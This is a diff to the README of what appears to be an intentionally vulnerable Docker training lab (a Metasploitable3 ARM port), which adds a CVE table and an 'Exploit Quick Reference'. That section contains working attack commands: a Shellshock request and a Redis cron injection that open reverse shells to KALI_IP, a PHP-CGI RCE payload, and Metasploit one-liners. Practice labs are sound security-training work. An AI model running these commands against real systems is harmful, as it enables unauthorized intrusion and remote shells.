@@ -9,18 +9,30 @@
 
 ---
 
-## Vulnerable Services
+## Vulnerable Services & CVEs (up to May 2026)
 
-| Port | Service | Vulnerability |
-|------|---------|---------------|
-| 21 | vsftpd | Anonymous login, backdoor emulated on port 6200 |
-| 22 | OpenSSH | `root:root` credentials, password auth enabled |
-| 80 | Apache + DVWA | SQLi, RCE, XSS, CSRF, File Upload (security: low) |
-| 139/445 | Samba 4 | Anonymous share, CVE-2007-2447 username map script |
-| 3306 | MariaDB | root with no password, bound to 0.0.0.0 |
-| 6200 | Backdoor shell | `nc -lkp 6200 -e /bin/bash` |
-| 8080 | Tomcat 9 | Manager app with `tomcat:tomcat` credentials |
-| 8585 | Apache RCE | `GET /shell.php?cmd=id` endpoint |
+| Port | Service | CVE | Severity | Description |
+|------|---------|-----|----------|-------------|
+| 21 | vsftpd | CVE-2011-2523 | CRITICAL | Backdoor — username `:)` triggers bind shell on port 6200 |
+| 22 | OpenSSH | CVE-2024-6387 | CRITICAL | regreSSHion — signal handler race, unauthenticated RCE as root |
+| 22 | OpenSSH | — | — | root:root credentials, `PermitRootLogin yes` |
+| 80 | Apache 2 | CVE-2024-38474 | CRITICAL | mod_rewrite encoding substitution — CGI RCE via encoded path |
+| 80 | Apache 2 | CVE-2014-6271 | CRITICAL | Shellshock — bash env injection via mod_cgi (`/cgi-bin/status`) |
+| 80 | PHP-CGI | CVE-2012-1823 | CRITICAL | PHP-CGI argument injection — `?-s` source disclosure, `?-d` RCE |
+| 80 | DVWA | — | — | SQLi, XSS, CSRF, File Upload, Command Injection |
+| 139/445 | Samba | CVE-2017-7494 | CRITICAL | SambaCry — .so from writable share → `is_known_pipename` RCE |
+| 139/445 | Samba | CVE-2007-2447 | HIGH | username map script injection (simulated) |
+| 2121 | ProFTPd | CVE-2015-3306 | CRITICAL | mod_copy — unauthenticated `SITE CPFR/CPTO` filesystem write → RCE |
+| 3306 | MariaDB | CVE-2021-27928 | HIGH | `SET GLOBAL wsrep_provider` OS command injection |
+| 3306 | MariaDB | UDF payload | HIGH | mysql_udf_payload — FILE priv + writable plugin dir → sys_exec() |
+| 6200 | Backdoor | CVE-2011-2523 | CRITICAL | nc bind shell (vsftpd 2.3.4 functional emulation) |
+| 6379 | Redis | CVE-2022-0543 | CRITICAL | Lua sandbox escape + unauthenticated CONFIG SET filesystem write RCE |
+| 6667 | UnrealIRCd | CVE-2010-2075 | CRITICAL | Backdoor in 3.2.8.1 — `DEBUG3` triggers connect-back shell |
+| 8009 | Tomcat AJP | CVE-2020-1938 | CRITICAL | Ghostcat — AJP file read/inclusion → RCE |
+| 8080 | Tomcat 9 | CVE-2025-24813 | CRITICAL | Partial PUT + Java deserialization — unauthenticated RCE |
+| 8080 | Tomcat 9 | CVE-2021-44228 | CRITICAL | Log4Shell — JNDI injection via `X-Api-Version` header |
+| 8080 | Tomcat 9 | — | — | Manager app — `tomcat:tomcat` default credentials |
+| 8585 | Apache | — | — | PHP RCE shell (`?cmd=id`) |
 
 ## CTF Flags
 
@@ -44,14 +56,9 @@
 ## Quick Start
 
 ```bash
-# Clone
 git clone https://github.com/your-username/metasploitable3-arm.git
 cd metasploitable3-arm
-
-# Start the lab
 docker compose up -d
-
-# Verify all services are up
 docker exec metasploitable3 supervisorctl status
 ```
 
@@ -60,11 +67,9 @@ docker exec metasploitable3 supervisorctl status
 ## Build Multi-Platform Image (Docker Hub)
 
 ```bash
-# Create builder (once)
 docker buildx create --name ms3-builder --use
 docker buildx inspect --bootstrap
 
-# Build and push
 docker buildx build \
   --platform linux/arm64,linux/amd64 \
   -t your-username/metasploitable3-arm:latest \
@@ -73,50 +78,56 @@ docker buildx build \
 
 ---
 
-## Connecting Kali Linux ARM (UTM / Parallels)
-
-### Option A — Via Host IP
-
-From your Kali VM, the Mac host IP (typically `192.168.64.1` on UTM) routes to Docker:
+## Exploit Quick Reference (from Kali)
 
 ```bash
-export TARGET=192.168.64.1
+export TARGET=192.168.64.1   # Mac host IP (UTM) or 172.20.0.10 (bridge)
 
 # Full port scan
-nmap -sV -p 21,22,80,139,445,3306,6200,8080,8585 $TARGET
-```
+nmap -sV -p 21,22,80,139,445,2121,3306,6200,6379,6667,8009,8080,8585 $TARGET
 
-### Option B — Direct Container IP
+# CVE-2024-6387 regreSSHion
+# PoC: https://github.com/l0n3m4n/CVE-2024-6387
 
-If Kali shares the Docker bridge `172.20.0.0/24`:
+# CVE-2014-6271 Shellshock
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/KALI_IP/4444 0>&1' \
+  "http://$TARGET/cgi-bin/status"
+# Metasploit: use exploit/multi/http/apache_mod_cgi_bash_env_exec
 
-```bash
-nmap -sV 172.20.0.10
-```
+# CVE-2012-1823 PHP-CGI
+curl "http://$TARGET/cgi-bin/php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
+  --data "<?php system('id'); ?>"
 
-### Quick Access Commands
+# CVE-2015-3306 ProFTPd mod_copy
+msfconsole -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS $TARGET; set RPORT 2121; run"
 
-```bash
-# SSH (root:root)
-ssh root@$TARGET
+# CVE-2022-0543 Redis RCE
+redis-cli -h $TARGET CONFIG SET dir /var/spool/cron/crontabs
+redis-cli -h $TARGET CONFIG SET dbfilename root
+redis-cli -h $TARGET SET cron "*/1 * * * * bash -i >& /dev/tcp/KALI_IP/4444 0>&1\n"
+redis-cli -h $TARGET BGSAVE
 
-# FTP anonymous
-ftp $TARGET
+# CVE-2010-2075 UnrealIRCd backdoor
+msfconsole -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS $TARGET; run"
 
-# DVWA
-curl http://$TARGET/dvwa/
+# CVE-2021-44228 Log4Shell
+msfconsole -x "use exploit/multi/http/log4shell_header_injection; set RHOSTS $TARGET; set RPORT 8080; set TARGETURI /log4shell; run"
 
-# Tomcat Manager
-curl http://tomcat:tomcat@$TARGET:8080/manager/html
+# CVE-2020-1938 Ghostcat
+msfconsole -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS $TARGET; run"
 
-# MySQL root (no password)
-mysql -h $TARGET -u root
+# CVE-2025-24813 Tomcat partial PUT
+curl -X PUT http://$TARGET:8080/uploads/shell.session \
+  -H "Content-Range: bytes 0-3/8" -d $'\xac\xed\x00\x05'
 
-# RCE test
-curl "http://$TARGET:8585/shell.php?cmd=whoami"
+# CVE-2017-7494 SambaCry
+msfconsole -x "use exploit/linux/samba/is_known_pipename; set RHOSTS $TARGET; run"
 
-# SMB
-smbclient -L //$TARGET -N
+# mysql_udf_payload
+msfconsole -x "use exploit/multi/mysql/mysql_udf_payload; set RHOSTS $TARGET; set PASSWORD ''; run"
+
+# CVE-2011-2523 vsftpd backdoor
+nc $TARGET 6200
 ```
 
 ---
@@ -124,7 +135,7 @@ smbclient -L //$TARGET -N
 ## Gitflow Branch Structure
 
 ```
-main       ← tagged releases (v1.0.0, v1.1.0)
+main       ← tagged releases (v1.0.0, v1.1.0, v1.2.0)
 develop    ← integration
 feature/*  ← new services or vulnerabilities
 release/*  ← release prep
@@ -135,7 +146,7 @@ hotfix/*   ← critical patches
 
 ```bash
 pip install -e ".[test]"
-# With the container running:
+docker compose up -d && sleep 60
 pytest tests/ -v
 ```
 
